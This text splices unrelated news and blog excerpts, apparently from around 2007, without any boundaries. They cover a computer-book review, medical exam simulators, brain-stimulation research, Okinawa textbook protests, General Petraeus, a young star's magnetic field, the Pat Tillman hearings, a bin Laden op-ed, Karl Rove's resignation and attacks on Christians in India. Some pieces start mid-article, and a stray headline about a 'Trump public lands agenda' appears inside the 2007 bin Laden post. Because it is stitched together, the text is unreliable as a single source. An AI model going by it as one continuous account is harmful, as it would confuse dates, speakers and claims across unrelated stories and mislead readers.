That cover would be banned in Boston , which is where I 've lived .
So I had to play cool and say " Secret " Guide to Computers .
But here 's the real secret : this book 's about sex .
If you marry a computer but already married a human , your human spouse will call you a " bigamist " and feel jealous of the computer .
Your marriage to that human can deteriorate and end in divorce .
Although it 's primarily targeted at novices , I distinctly remember one long winter weekend in 1993 reading the entire Secret Guide cover to cover .
Walter 's enthusiasm rings through on every page .
His no-nonsense , no - budget D.I.Y .
ethos outshines any number of polished , soulless commercial books .
Russ is an interesting guy ; there 's a tiny biography of him in the " about the author " section of this book review .
He also has the audacity to publish his phone number in the book , and encourage people to call him , any time , 24 hours a day , with only a few strings attached .
His book is completely self - published under a " copywrong " license .
And evidently he means it : he offers a CD - ROM version with the unabridged text of the book in various formats , and semi-authorized versions of the text are available all over the web .
One of them even has a higher pagerank than his own site , which is unfortunate .
For more enthusiasm that borders on insanity , Russ offers samples of his books online .
You can read 24 chapters of the latest edition of the Secret Guide , as well as 24 chapters of the companion book , Tricky Living .
I long ago gave away my copy of The Secret Guide , but Russ is exactly the kind of guy I love to support , so I 'll be buying new copies .
I also own Charles Petzold 's book , Code .
It 's another love letter to the computer .
Instead of a long , rambling love letter , Code is a collection of elegantly written sonnets .
It has an austere layout , filled with beautiful diagrams .
It gently guides you through the history of the computer , at the lowest and most fundamental levels , from Babbage to modern times .
But it 's no less urgent in its affections .
Code is at the absolute opposite end of the spectrum from The Secret Guide .
There probably are n't two more different books on the planet .
But if you think Charles Petzold 's any less dedicated than Russ Walter , consider this : which one has a Windows tattoo ?
And which one wears a witch 's hat and red kimono over a monk 's habit and roller skates to computer fairs ?
Well , sometimes love makes you do crazy things .
I 'm with Petzold and Walter .
If loving computers is wrong , I do n't want to be right .

Sex shops can provide useful teaching tools ....
Worried by the quality and anatomical accuracy of mannequins available for her students to practise on , Dr Pugh decided to take matters into her own hands and provide her own .
" One model that was available for teaching the students had the rectum in the wrong place , in another the prostate was in the wrong position .
" The penises that were available were made of styrofoam and they were all the same .
Secret motive
" So I decided to get my own , " said the assistant professor of surgery at Northwestern University 's Feinberg School of Medicine , Chicago .
" I had to go into porn shops and ask for lots of penises , all sizes , erect and not erect , circumcised and non-circumcised .
I was met with gales of laughter in the shops . "
They would be really freaked if they knew I wanted the dolls to cut up
Carla Pugh
She also frequents toy shops for materials , but admits she does not tell the shop assistants what she wants her weird collection of objects for .
" They would be really freaked if they knew I wanted the dolls to cut up , " she laughed .
She also buys baby dolls for delivery models , squishy balls are used to represent ovarian masses and harder wooden balls for ovarian cancers .
Models are combined with computer technology
" I think my students are clueless about what I have gone through to get the materials to teach them - but what students do know the work their teacher has done to prepare ? "
Dr Pugh has also patented technology to combine portions of fully formed anatomical mannequins with computers to teach medical students to do exams on the body 's most private and sensitive areas - genitalia , breasts and rectums .
At the prostate station students can examine several models of the male posterior .
Sensors
In each they have a fully formed anus and rectum .
There are paper - thin sensors inside to measure a student 's touch and send individual readings to an attached computer monitor .
These are the sort of exams , she said , that students are often most worried about performing and which medical school instructors can also find embarrassing .
Dr Pugh practised on her own dolls as a child
" We 've got big issues in the US with sexuality , " said Dr Pugh .
" These guys have to be able to do it and act professional , so that adds a lot of pressure . "
Cadavers are still used for anatomy , but Dr Pugh said that , as in the UK , there has been a shortage of bodies being offered for donation .
But she added that even when these bodies were available , often they were not suitable for students to practice on .
" Many of the women who donate their bodies have had hysterectomies , so the students do not have a uterus to practise on , " she said .
Natural sensation
She also added that practising on a rigid rigor mortis body was very different from the softer form of the live body that her students would encounter .
Aids are devised to give a naturalistic feel
Dr Pugh said her simulators were not perfect , but that they were close enough to the reality for the students to know whether their touch is too rough , too soft - or if they have missed a key spot entirely .
They provided a much needed bridge , she said , between traditional medical training where students often go straight from textbook to exam room with live patients , where they observe skilled doctors in action .
" Guess what ?
They are sweating bullets because they have n't had a scenario where they can talk about it comfortably , safely and with someone who is more knowledgeable . "
Dr Pugh began performing " surgery " on her dolls as a child , transplanting eyes and limbs with a sewing kit borrowed from her mother .
She said she had always maintained a hands - on approach to medicine .
But she felt very disappointed by how little ' real - life ' practice she was able to do as a student herself .
" It frustrated me because I was unsure .
I did n't have the level of access to the human body that I wanted . "
Doctorate
Dr Pugh 's prostate simulator
She came up with the idea for her technology while working on a doctorate in education at Stanford University and obtained a patent for the sensors and data accumulation technology in 2001 .
Pugh formed a licensing agreement with Medical Education Technologies Inc , a company specialising in medical training products , in early 2003 .
Her pelvic exam simulators are already on the market at prices ranging from $ 16,000 ( £ 8,200 ) to $ 20,000 ( £ 10,300 ) each , and are used by more than 60 medical and nursing schools around the US .
The prostate exam simulators used in the class , as well as those for breast exams , are still in prototype form .
Illustration of the visual cortex during transcranial magnetic stimulation ( TMS ) .
In this non-invasive brain stimulation technique , pulses of current ( arrows ) are passed through a figure - eight shaped coil placed above the scalp .
The induced electric field elicits long - lasting alterations in neural activity which can be measured with blood flow - based imaging methods .
( Elena Allen / UC Berkeley )
Neuroscientists at the University of California , Berkeley , have for the first time measured the electrical activity of nerve cells and correlated it to changes in blood flow in response to transcranial magnetic stimulation ( TMS ) , a noninvasive method to stimulate neurons in the brain .
Their findings , reported in the Sept. 28 issue of the journal Science , could substantially improve the effectiveness of brain stimulation as a therapeutic and research tool .
With technological advances over the past decade , TMS has emerged as a promising new tool in neuroscience to treat various clinical disorders , including depression , and to help researchers better understand how the brain functions and is organized .
TMS works by generating magnetic pulses via a wire coil placed on top of the scalp .
The pulses pass harmlessly through the skull and induce short , weak electrical currents that alter neural activity .
Yet the relative scarcity of data describing the basic effects of TMS , and the uncertainty in how the method achieves its effects , prompted the researchers to conduct their own study .
" There are potentially limitless applications in both the treatment of clinical disorders as well as in fundamental research in neuroscience , " said Elena Allen , a graduate student at UC Berkeley 's Helen Wills Neuroscience Institute ( HWNI ) and co-lead author of the study .
" For example , TMS could be used to help determine what parts of the brain are used in object recognition or speech comprehension .
However , to develop effective applications of TMS , it is first necessary to determine basic information about how the technique works . "
Other techniques for studying neural activity in humans , such as functional magnetic resonance imaging ( fMRI ) or electroencephalogram ( EEG ) , only measure ongoing activity .
TMS , on the other hand , offers the opportunity to non-invasively and reversibly manipulate neural activity in a specific brain area .
In a set of experiments , the researchers used TMS to generate weak , electrical currents in the brain with quick 2 - to 4 - second bursts of magnetic pulses to the visual cortex of cats .
Direct measurements of the electrical discharge of nerve cells in the region in response to the pulses revealed that TMS predictably caused an initial flurry of neural activity , significantly increasing cell firing rates .
This increased activity lasted 30 to 60 seconds , followed by a relatively lengthy 5 to 10 minutes of decreased activity .
What the researchers were able to determine for the first time was that the neural response to TMS correlated directly to changes in blood flow to the region .
Using oxygen sensors and optical imaging , the researchers found that an initial increase in blood flow was followed by a longer period of decreased activity after the magnetic pulses were applied .
" This long - lasting suppression of activity was surprising , " said Brian Pasley , a graduate student at HWNI and co-lead author of the study .
" We 're still trying to understand the physiological mechanisms underlying this effect , but it has implications for how TMS could be used in clinical applications . "
The critical confirmation of the connection between blood flow and neural activity means that researchers can use TMS to alter neural activity , and then use fMRI , which tracks blood flow changes , to assess how the nerve cells respond over time .
" One of the most exciting applications of TMS is the ability to non-invasively modify neural activity in specific ways , " said Pasley .
" The brain is malleable , so brain stimulation may be used to alter and promote specific functions , like learning and memory , or suppress abnormal activity that underlies neurological disorders .
If we can figure out the right ways to stimulate the brain , TMS will likely be useful in attempts to improve neural function . "
The researchers noted that one of the difficulties in using TMS for specific applications is the fact that its effects vary in different brain regions and individuals .
" Using TMS is inherently challenging because its neural effects can be so variable , " said Ralph Freeman , UC Berkeley professor of vision science and optometry and principal investigator of the study .
" Fortunately , we can determine empirically what the end result is by making measurements with fMRI .
This should be valuable to clinicians who must evaluate the effectiveness of a stimulation treatment .
In turn , fMRI may serve as a guide to determine adjustments in treatment parameters . "
The study was also co-authored by Thang Duong , a UC Berkeley graduate student in vision science .
The National Eye Institute of the National Institutes of Health and the National Science Foundation helped support this research .

The protest , in Okinawa , was against moves to modify and tone down passages that say the army ordered Okinawans to kill themselves rather than surrender .
Okinawa 's governor told crowds they could not ignore army involvement .
Some conservatives in Japan have in recent years questioned accounts of the country 's brutal wartime past .
Saturday 's rally was the biggest staged on the southern island since it was returned to Japan by the United States in 1972 , according to the Kyodo News agency .
Grenades
When US soldiers invaded Okinawa at the end of World War II , more than 200,000 people died .
Hundreds of them were Japanese civilians who killed themselves .
The textbooks , intended for use in high schools next year , currently say that as the Americans prepared to invade , the Japanese army handed out grenades to Okinawa residents and ordered them to kill themselves .
Many survivors insist the military told people to commit suicide , partly due to fears over what they might tell the invaders and because being taken prisoner was considered shameful .
The governor of Okinawa , Hirokazu Nakaima , told crowds the episode should not be forgotten .
" We cannot bury the fact that the Japanese military was involved in the mass suicide , taking into account of the general background and testimonies that hand grenades were delivered , " he said .

Within the military , the White House , and the halls of Congress , General David H. Petraeus has become a near - mythic figure , which is perhaps fitting for a man who has been handed the superhuman task of bringing order to the seemingly intractable chaos in Iraq .
Regarded as a straight shooter by Republicans and Democrats alike , and well respected among current and former military officials , his name has been invoked alongside those of legendary military leaders ( among them Dwight Eisenhower ) and tales of his keen intellect , competitive flair , and grit abound .
According to one piece of Petraeus lore , several days after taking an M - 16 round to the chest during a training mishap in 1991 , he rose from his bed , dropped to the floor , and proceeded to do 50 pushups .
Colonel William Darley , the editor of the army - run journal Military Review , served under Petraeus while he was the commanding officer at Fort Leavenworth , home to the elite Army Command and General Staff College , where , among other things , Petraeus oversaw the drafting of the military ’s oft - touted Counterinsurgency Field Manual .
Darley describes him as “ a genuine soldier - scholar - diplomat ” and a “ lead by example ” type of officer , adding that he is also “ the most competitive person I have ever known — ever . ”
He will not just beat you , Darley says , but “ make a point of it . ”
“ This guy is a major intellect with vision and discipline and drive — and he can do more one - armed push - ups than anyone I know , ” says Lieutenant Colonel John Nagl , a member of the writing team that produced the Counterinsurgency Field Manual .
Nagl met Petraeus twenty years ago while interning at Supreme Headquarters Allied Powers Europe , where Petraeus served as a speechwriter to then - NATO military commander General John Galvin .
He recalls going running with Petraeus last year at Fort Sill in Oklahoma , where , he says , the general left men 20 years his junior “ trailing in his wake and , literally , gasping for breath .
“ He ’s been shot in the chest , he has a shattered hip , and he ran me into the ground , ” Nagl says .
Just as legendary as his competitive streak and fanaticism for physical fitness is Petraeus ’ ambition .
A three - decade career in the military has seen him graduate at the top of his class at West Point , earn a Ph.D. from Princeton , and , most recently , receive his fourth star as a general .
But in the eyes of some of his critics ( who call him “ King David ” ) , his ambition reads as grandstanding and self - promotion .
This image was no doubt reinforced in July 2004 when Petraeus , then in charge of training Iraq ’s security forces , appeared on the cover of an issue of Newsweek that bore the headline , “ Can This Man Save Iraq ? ”
Petraeus ’ leadership qualities , combined with his role as the Bush administration ’s last hope for saving face on Iraq , has set off speculation that the general could run for office some day — possibly the presidency , in 2012 .
“ This man is a walking mass of ambition , ” says a former senior intelligence official .
“ I ’m sure he ’s thinking about Dwight Eisenhower every day .
I know people who know him and they all think that ’s true . ”
The Petraeus - for - President scenario is out there , confirms Steve Clemons , a senior fellow at the New America Foundation and author of the popular beltway blog , the Washington Note .
“ A lot of people around him are beginning to think it ’s the natural way . ”
Petraeus , he adds , could find himself on a “ Wes Clark - like track , but on the Republican side . ”
Then again , cautions the former intelligence official , “ Unless you ’re Dwight Eisenhower , George Marshall , or Douglas MacArthur , the chance that anyone is going to take you seriously , it ’s not very high .
Look at Wes Clark .
He ’s a bright fellow , but people just do n’t give a shit about him enough to make that a possibility .
But if you came back from Iraq and there was a reasonable outcome , then a guy as attractive and well spoken as Petraeus would become a possibility . ”
A military official and longtime friend of Petraeus says he has “ extraordinary political instincts , ” noting that he has put them to the test in Iraq in his negotiations with tribal leaders and the country ’s fractious political parties .
“ He would absolutely shoot me for saying this , but the nation would be very well served ” if he ran for office , the official says .
So , if the general does harbor political ambitions , would that reflect on the progress report he is to deliver to Congress this week ?
One former military official who served in Iraq suggests that his reputation might be better served by providing a “ rational assessment , ” even if that puts him at odds with the White House .
“ If he were to defy the president bent on distorting the truth , he would be honored many times over . ”
On the other hand , the official adds , “ If ambition starts to overrule duty , then we have a problem . ”
Lawrence Korb , a senior fellow at the Center for American Progress who served as an assistant secretary of defense during the Reagan administration , worries that Petraeus could try too hard to accentuate the positive in Iraq .
He has called Petraeus “ the most political general since General [ Douglas ] MacArthur , ” who was considered a possible Republican contender in the 1952 election that ultimately went to Eisenhower .
In particular , Korb points to a Washington Post op -ed Petraeus wrote a few weeks before the 2004 election , delivering an upbeat assessment of the progress made in training Iraq ’s security forces .
“ That ’s not something Eisenhower would do ; MacArthur would do that , ” Korb says .
“ With MacArthur he was basically trying to influence the policy . ”
Which means , Korb says , that Petraeus ’ Iraq assessment should be taken “ with a grain of salt given his previous track record . ”
Last week , nearly three years after Petraeus reported signs of “ tangible progress ” in his Washington Post op - ed , while acknowledging “ tough times ” ahead , an independent congressional commission headed by retired General James Jones , the former commandant of the Marine Corps , said that it will be at least another year before the Iraqi army can take the lead in providing security for the country .
In far worse shape is the Iraqi police force , which the report said is “ incapable of providing security at a level sufficient to protect Iraqi neighborhoods . ”
Lawrence Wilkerson , the retired army colonel who served as Colin Powell ’s chief of staff at the State Department , calls Petraeus a “ good officer ” but questions his work training Iraq ’s security forces .
“ When he was associated with the training to get as many Iraqis stood up in the security arena , he was fascinated by numbers , ” Wilkerson says .
“ I had people working in Iraq , both civilian and military , who emailed me on a daily basis telling me that Petraeus was more interested in numbers than he was quality and that the forces that were being ‘ trained ’ were n’t really viable .
That ’s pretty much come to pass . ”
Wilkerson continues , “ He ’s part of this whole process the Bush administration has created , which is a bunch of military leaders who are either scared to death or so fascinated with their own power and ambition that they ’re not willing to tell the emperor he ’s got no clothes on . ”
Nevertheless , Wilkerson remains cautiously optimistic that Petraeus , together with Ambassador Ryan Crocker , will “ provide a fair assessment of what ’s going on over there , with all the warts . ”
In terms of what Petraeus will say when he appears before Congress on Monday , “ he has kept his thoughts very close to his chest , ” a person close to the general says .
Reports that have trickled out over the past couple weeks indicate that he is likely to recommend maintaining an enhanced troop presence in Iraq into next year , in line with the Bush administration ’s stay - the - course stance .
In a letter to troops on Friday , previewing what he planned to tell Congress , Petraeus was optimistic , while conceding that progress has not been “ uniform . ”
Describing the situation in Iraq as “ exceedingly complex , ” he told the troops that “ we are , in short , a long way from the goal line , but we do have the ball and we are driving down the field . ”
Meanwhile , the faint rumblings about an eventual Petraeus candidacy grew a bit louder in advance of his appearance on the Hill .
On Thursday , the New York Sun ran an editorial suggesting a scenario in which the general rebukes congressional Democrats for “ undermining ” his mission and threatens to resign to take his “ case to the voters in a run for the presidency on a campaign to finish the work of winning the war . ”
Most other observers see that as far - fetched .
“ I ’m quite convinced that he ’s 100 percent concentrated on conducting the war , ” says Stephen Biddle of the Council on Foreign Relations , who met with Petraeus last spring as part of a team sent to Iraq to assess the effectiveness of the surge .
“ I do n’t think that I ’ve seen any evidence that some desire for high political office is somehow polluting or distorting his judgment about Iraq . ”
For his part , Petraeus is clearly aware of the speculation — and doing nothing to either fan or discourage it .
“ I ’ve heard him laugh every time anyone brings up the political aspects , ” says Colonel Steve Boylan , Petraeus ’ spokesman .
Downplaying the Eisenhower comparisons , he likens Petraeus instead to General George Marshall , the army chief of staff during World War II , who refused to vote in order to remain above politics ( just as Petraeus has done since joining the senior leadership , Boylan notes ) .
“ I ’ve heard him state on the record and in various venues that he has no political leanings and that he plans on being a soldier for the foreseeable future , ” Boylan says .
“ What happens five , 10 , 15 years from now , who knows ? ”
University of St Andrews astronomers have succeeded in tracing the magnetic web that binds newly forming stars to their surrounding gas and dust .
The findings will improve understanding of how stars , including the Sun , form .
The Scottish scientists were part of an international team led by French astronomer Jean - Francois Donati .
St Andrews researcher Dr Moira Jardine said , " This is the first time that we 've been able to map the magnetic field of a star that is so young that it is still forming .
We know that new stars form in molecular clouds and , as they collapse they should spin up - just like an ice - skater pulling in their arms to spin .
That was the theoretical prediction anyway but , when young stars were first observed , it was found that they were in fact spinning quite slowly , contrary to the original prediction . "
" We 've thought for some time now that this rapid spinning is prevented by the magnetic web that links the new star to the disk of gas and dust out of which it formed .
Now , for the first time , we 've been able to trace the individual strands of this web along which gas drains out of the disk and onto the star .
These new observations will help us to understand how stars like the Sun formed , and how their surrounding disks might evolve to form planets like our own " .
The baby star in question ( V2129 Ophiuchi ) is only a few million years old and is so young that it is still forming .
It is currently shrinking down to its adult proportions so , although it is about the same weight as the Sun , it is about 2.5 times its size .
It can be found in the constellation Ophiuchus but , at a distance of 420 light years , is about a million times too faint to be seen with the naked eye .
The paper is published in Monthly Notices of the Royal Astronomical Society .

Former Defense Secretary Donald Rumsfeld claims no cover -up in Pat Tillman death
By Andre Damon
2 August 2007
Former Defense Secretary Donald Rumsfeld testified Wednesday before a congressional investigation into the fratricidal shooting of professional football player turned soldier Pat Tillman .
Rumsfeld claimed that there was no cover - up within the military over Tillman ’s death , a position that flies in the face of evidence that has emerged over the past three years .
Tillman joined the military after September 11 , 2001 , leaving a career in the National Football League .
When he was killed in Afghanistan on April 22 , 2004 , the incident was used as a propaganda tool by the US government .
The Pentagon immediately suppressed solders ’ reports acknowledging that Tillman had been killed by friendly fire , and told the media that he had died while attempting to storm Afghan positions .
This was followed by weeks of triumphant coverage in the media .
Tillman was lauded as a hero who had “ given his life for his country . ”
It emerged later , however , that the story given of his death was fabricated , and that he was not killed by Afghan insurgents .
These facts were withheld from his family and the American public .
On Tuesday , the US Army issued a report declaring , “ In seven investigations into this tragedy , not one has found evidence of a conspiracy by the Army to fabricate a hero , deceive the public , or mislead the Tillman Family about the circumstances of Cpl. Tillman ’s death . ”
These claims are contradicted by the findings of the previous House Oversight and Government Reform Committee investigation held in April , in which committee chairman Henry Waxman concluded that “ evidence was destroyed ” and “ witness statements were doctored . ”
Testifying before the same House committee Wednesday , Rumsfeld claimed that he “ did not recall ” when he was informed of the circumstances surrounding Tillman ’s death , but said it was around May 20 , 2004 — about a month after Tillman was killed and six days after his family was told .
Rumsfeld denied having anything to do with the story given by the Pentagon .
In addition to Rumsfeld , two top generals — John Abizaid and Richard Myers — testified before the committee .
Both of them denied any conscious wrongdoing in the affair .
Thus far , it appears that Lieutenant General Philip Kensinger has been singled out to take the blame for the entire incident .
On Tuesday he was censured and may be demoted after an Army report declared he had not notified the Tillman family about the possibility that Tillman had been killed by friendly fire .
“ Lieutenant General Kensinger deceived investigators about what he knew and when he knew it , ” said Army Secretary Pete Geren , who recommended Kensinger ’s demotion .
“ He made false official statements . ”
Although a subpoena was issued for Kensinger to appear before Wednesday ’s committee hearing , Waxman said Kensinger did not reply to the summons and could not be found .
In the course of previous investigations , Kensinger told investigators on at least 70 occasions that he could not recall the details of previous events .
Mary Tillman ,
Pat ’s mother , said of the Army investigation released earlier this week , “ It ’s so humiliating and disrespectful .
It ’s one more example of the Army investigating itself , ” she told the New York Daily News .
“ It was all done to glorify this war .
It ’s a sham .
Pat deserves the truth . ”
The Tillman family has repeatedly insisted that Rumsfeld and other high - ranking military and political officials participated in the cover up .
It would indeed have been highly unlikely for the Rumsfeld , a notorious micromanager , to have been unaware of the circumstances surrounding Tillman ’s death .
The coordination of media fanfare and the Pentagon ’s rapid generation of a fake story , which served as the basis for awarding Tillman medals and posthumous promotion , would have required high - level oversight .
The committee noted that Rumsfeld himself sent a memo to Tillman early on , congratulating him on joining the Army Rangers .
Rumsfeld sent another memo to a subordinate , instructing him to “ keep an eye on ” Tillman .
Under these circumstances , Rumsfeld ’s claims that he was oblivious to the circumstances surrounding Tillman ’s death are highly dubious .
When President Bush spoke on Tillman ’s death at the end of April 2004 , he avoided speaking about how Tillman died — a clear indication that the White House already knew the truth only a week after the incident took place , but several weeks before Tillman ’s family was informed that friendly fire was involved .
Earlier this month , the White House refused to turn over documents requested by the oversight committee , claiming executive privilege .
The Bush administration has taken the position that any communication or documents involving the executive branch can be kept secret on the grounds of executive privilege — an extraordinary and unconstitutional assertion of Presidential power .
Representatives Waxman and Thomas Davis ( the ranking Republican on the committee ) sent letters of protest to the White House and Pentagon , but did nothing else .
In his opening report yesterday , Waxman stated , “ We have tried to find out what the White House knew about Corporal Tillman ’s death .
We know that in the days following the initial report , at least 97 White House officials sent and received hundreds of e-mails about Corporal Tillman ’s death and how the White House and the President should respond . ”
Waxman continued : “ weeks later — in the days before and after the Defense Department announced that Corporal Tillman was actually killed by our own forces — there are no e-mails from any of these 97 White House officials about how Corporal Tillman really died . ”
Waxman concluded , “ No one will tell us when and how the White House learned the truth . ”
The investigation comes in the wake of new evidence suggesting that Tillman may have been killed intentionally .
According to documents obtained by the Associated Press , the doctor who performed Tillman ’s autopsy sought to initiate a criminal investigation into the his death , but was turned away by both the Army ’s Human Resources Command and the Criminal Investigation Division .
The doctor concluded that Tillman had been shot in the forehead by three bullets from an M - 16 at about 10 yards away , although the nearest eyewitness continues to claim that the shooter was farther away .
Tillman was shot after setting off several smoke grenades and while waving his hands and yelling for the soldiers to stop shooting .
The documents also note that no evidence of fire from Afghan insurgents was discovered at the scene of Tillman ’s death , and that no equipment or personnel were struck .
Tillman was reportedly an opponent of the war in Iraq .
He was an avid reader of radical historian and linguist Noam Chomsky , whom he had contacted and was planning to meet after his return from active duty .
After Tillman ’s death , his clothes were removed and burned , and his personal possessions , including a daily journal , mysteriously disappeared .
Bryan O’Neal , who had been next to Tillman when the latter was killed , was told by his commanding officer not to inform anyone of the circumstances of his death , especially Tillman ’s brother , Kevin .
O’Neal told the House Oversight and Government Reform Committee in April that his commanding officer told him , “ Do not let Kevin know , that he ’s probably in a bad place knowing his brother ’s dead . ”
Kevin Tillman was also an Army Ranger at the time , and was in a convoy behind his brother when Pat Tillman was killed .
O’Neal was asked to describe the moment of Tillman ’s death for the latter ’s posthumous commendations .
He testified that his statements were later doctored and that erroneous claims about Afghan fire somehow made their way into the final draft .
Tillman ’s death came at a time when the US government and military were trying to reestablish their credibility after the publication of photos from Abu Ghraib and a string of setbacks in Afghanistan .
“ Revealing that Pat ’s death was a fratricide would have been yet another political disaster during a month already swollen with disasters , ” Kevin Tillman told the house oversight committee in April .
He accused the Bush administration of “ deliberate and calculated lies ” in the case .
Boy , even FOX News analysts are calling the Bush Administration ( and the military generals -- Watch out ! ) incompetent .
I have to admit that this story seemed completely buried until I heard it this morning on the Stephanie Miller Show .
I only found one MSM story on it , which I do n't remember seeing at the time , and I get MSNBC news alerts constantly .
Maybe the press should try doing their job and ask a few questions at the next presser ???
I 'd think that it would be in the public 's interest to know how well we are going after known enemies before they create even more in Iran , would n't you ?
Col. David Hunt ( ret. ) on FOXNews.com
( I 'm citing the relevant portion if you do n't want to give them the hits ) :
Besides , these things are of little consequence when you realize how we missed , squandered , screwed up , made a mess of and were massively risk adverse - again - when we did not kill Usama bin Laden in Afghanistan just two short months ago .
We know , with a 70 percent level of certainty - which is huge in the world of intelligence - that in August of 2007 , bin Laden was in a convoy headed south from Tora Bora .
We had his butt , on camera , on satellite .
We were listening to his conversations .
We had the world 's best hunters / killers - Seal Team 6 - nearby .
We had the world class Joint Special Operations Command ( JSOC ) coordinating with the CIA and other agencies .
We had unmanned drones overhead with missiles on their wings ; we had the best Air Force on the planet , begging to drop one on the terrorist .
We had him in our sights ; we had done it .
Nice job again guys - now , pull the damn trigger .
Unbelievably , and in my opinion , criminally , we did not kill Usama bin Laden .
You cannot make this crap up ; truth is always stranger and more telling than fiction .
Our government , the current administration and yes , our military leaders included , failed to kill bin Laden for no other reason than incompetence .
The current " boneheads " in charge will tell you all day long that we are fighting and dying in Iraq and Afghanistan to stop terrorists there so they do not come here .
Nice talk , how about - just for a moment - acting like you mean what you say ?
You know walk the walk .
These incidents , where we displayed a total lack of guts , like the one in August , are just too prevalent .
The United States of America 's political and military leadership has , on at least three separate occasions , chosen not capture or kill bin Laden or Ayman al - Zawahri .
We have allowed Pakistan to become a safe haven for Al Qaeda .
We have allowed Al Qaeda to reconstitute , partially because of money they ( Al Qaeda in Iraq ) have been sending to Al Qaeda in Pakistan .
I 'm waiting for Boehner to introduce a resolution censuring Col .
Hunt now ...
Trump public lands agenda threatened by new court ruling - lawyers

Karl Rove Failed Conservatism By Moving The Republican Party Left
Somehow I 've gotten on the email list of Richard Viguerie .
He 's the king of conservative direct mail , and was one of the main figures in the founding of Moral Majority .
Today he sent out a press release applauding Karl Rove 's resignation .
Why ?
Because , you see , Rove failed conservatism :
Karl Rove was a master in the care and feeding of conservative leaders , keeping them mostly silent as the Republican Party moved Left during the Bush presidency ... Rove was the architect of George W. Bush ’s betrayal of the conservative cause ...
[ H ]e attempted to advance the Republican Party by using raw , naked political power and bribing voters .
He copied the Democrats and was more successful than them — for a while .
As Digby has pointed out :
George W. Bush will not achieve a place in the Republican pantheon .
Conservatism cannot fail , it can only be failed .
( And a conservative can only fail because he is too liberal . )
Apparently conservatism is much like communism : it may appear to have failed , but only because real conservatism has never truly been tried .
The entire email is below .
Richard Viguerie on Karl Rove ’s Resignation :
Good News for Conservatives
( Manassas , Virginia )
The following is a statement from Richard A. Viguerie , author of Conservatives Betrayed : How George W. Bush and Other Big Government Republicans Hijacked the Conservative Cause ( Bonus Books , 2006 ) , on the resignation of White House Deputy Chief of Staff Karl Rove :
“ Karl Rove ’s departure from the White House is good news for conservatives .
We may — may — have a more conservative Bush presidency with Rove back in Texas .
“ As President Bush ’s chief political advisor , Karl Rove was a master in the care and feeding of conservative leaders , keeping them mostly silent as the Republican Party moved Left during the Bush presidency .
“ He used the usual carrot and stick to do this .
The carrot was access to the White House — and conservative leaders proved just as vulnerable as others to the lure of a photo op with the President , lunch in the West Wing , or a returned phone call from Karl Rove .
The stick was fear — speak out , and not only will you lose any hope of access , you will be branded as an extremist , or someone who ’s helping the Democrats by speaking out .
“ Using both carrot and stick , Karl Rove was able to silence or get the support of most conservative leaders as President Bush and congressional Republicans greatly expanded the size and reach of the federal government , including ( but certainly not limited to ) …
No Child Left Behind
McCain- Feingold
Prescription drug benefits
Nation - building on a scale never attempted before
Farm subsidies
Steel tariffs
Massive federal deficits
“ Yes , Karl Rove was a political genius — he was , after all , the successful architect of Bush ’s election in 2000 and reelection in 2004 .
But as the President ’s chief policy advisor , Rove was the architect of George W. Bush ’s betrayal of the conservative cause .
“ Karl Rove ’s biggest failure was to leave the White House without achieving his stated goal of establishing the Republicans as America ’s permanent governing party .
To even mention that today — after the 2006 elections , President Bush ’s plummeting poll numbers , and the GOP ’s bleak prospects for 2008 — brings embarrassment or laughter , depending on your political viewpoint .
No wonder Karl Rove wants to forget about those boasts .
“ Rove failed in that goal primarily because he attempted to advance the Republican Party by using raw , naked political power and bribing voters .
He copied the Democrats and was more successful than them — for a while .
But then conservatives and independents caught on to his game .
We started rebelling , first over Harriet Miers and most recently over the amnesty bill .
Meanwhile , the Republican Party had lost its “ brand ” as the party of small government .
How do we recover from the Rove Era ?
We have to reject the bribing of voters and instead build on President Reagan ’s legacy .
We must re-establish the conservative movement ( and the Republican Party , if it wishes to survive ) as the movement and party of ideas , empowering people instead of government , and with a strong national defense but no more nation - building .
“ Bush ’s brain ” will soon be gone .
Let ’s hope that wiser counsel prevails in the White House in the future , but let ’s not depend on that .
We conservatives have work to do . ”
There have been " 70 cases reported [ of attacks against Christians ] in the last 18 months , " said Sajan George , the president of advocacy group Global Council of Indian Christians ( GCIC ) .
He said the anti-Christian attacks are " alarmingly increasing day by day " and that " it is time to respond by praying together and rallying as the time is running out . "
The rally was to be held September 22 at 10 am local time at the Gandhi statue in Bangalore ,
Karnataka ’s capital , by GCIC and other Christian rights groups .
" We invite all Christians , including pastors and church members , evangelists and prayer warriors , " added George .
He said the rally was to " protest the great rise in violence against Christians in Karnataka in the past 20 months . "
The Bangalore - based GCIC said it had evidence that suspected Hindu militants plan to launch " a serial attack against Christians in different parts of Mysore , " the second largest city in the Indian state of Karnataka , and nearby areas .
PASTOR ATTACKED
It also expressed concerns about the plight of Pastor K. Suresh , 39 , who has become " very popular among the poor and needy living near Mysore .
" Sursh was beaten up by the radicals from 1995 at regular intervals .
He remembers of four major physical attacks .
Twice his house was ransacked and church desecrated during the last 12 years . "
In one of the latest incidents , a group of about 35 people from the Hindu militants of the Rashtriya Swayamsevak Sangh ( RSS ) beat the principal of a Bible college on Monday , September 10 in Bangalore , George said .
Angam Haokip , head of the Bible college in the Kothanur area was allegedly attacked by men wearing vermillion on their foreheads and red thread on their wrists , a mark of followers of the RSS .
The attackers stopped Haokip ’s vehicle and attacked him after he confirmed he was a pastor .
They allegedly beat him , tried to crush his legs with boulders and kicked him on the nape of the neck before onlookers .
Police reportedly refused to accept his complain , accusing him instead of " rash driving . "
It came after a group of about 10 Hindu militants last week , September 6 , tied an independent evangelist , identified as 41 - year - old Madhikare , to a tree for at least three hours before chasing him out of Madhikare village in the Chinthamani area , George said .
He was apparently attacked while distributing evangelistic tracts .
Although he received minor injuries and required first aid , he refused to file a complain with local police , saying that would undermine his plans to return to the village to preach the Gospel , according to GCIC investigators .
CHRISTIANS INJURED
Elsewhere on September 6 , some six Hindu militants reportedly beat pastor Abey C. Mathew , 30 , of the Christian Ministry Church in Bangalore during a church service .
Mathew and congregation member Joseph Abraham were treated for injuries at Baptist Hospital .
" The mob told me to stop my reaching of a foreign faith and kept hitting me , " Pastor Mathew was quoted as saying by Compass Direct News , a Christian news agency .
“ They are now threatening my believers , who are now afraid to worship at he church .
On September 9 , very few attended Sunday worship . ”
Mathew , whose congregation consists of 22 people , reportedly filed a complaint at local police , but no arrests have been made .
In some case police allegedly pressure Christians , BosNewsLife monitored .
Earlier this month , on September 3 , police reportedly summoned three Christians after Hindu militants in the Bangarapet area of Kolar district in Karnataka , filed a complaint of forcible conversion .
